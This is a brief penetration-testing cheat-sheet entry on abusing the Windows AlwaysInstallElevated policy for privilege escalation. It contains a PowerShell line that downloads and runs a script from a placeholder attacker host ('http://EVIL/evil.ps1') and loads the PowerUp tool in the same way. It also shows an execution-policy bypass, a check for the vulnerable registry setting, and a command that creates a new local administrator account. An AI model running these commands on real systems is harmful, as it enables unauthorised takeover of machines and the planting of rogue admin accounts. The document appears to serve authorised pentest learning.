## Always Install Elevated

Windows environments provide a group policy setting which allows a regular user to install a Microsoft Windows Installer Package (MSI) with system privileges. This can be discovered in environments where a standard user wants to install an application which requires system privileges and the administrator would  like to avoid to give temporary local administrator access to a user.

Get https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

In Powershell
```
IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")
or
IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1")
```

```
powershell -ep bypass
Import-Module PowerUp.ps1
Get-RegistryAlwaysInstallElevated
```

If the last command returns True, system is vulnerable.

You can add an admin user by typing the following command.

```
Write-UserAddMSI 
```

You will get a prompt to enter the username and the password for the new user.


### References
https://pentestlab.blog/2017/02/28/always-install-elevated/
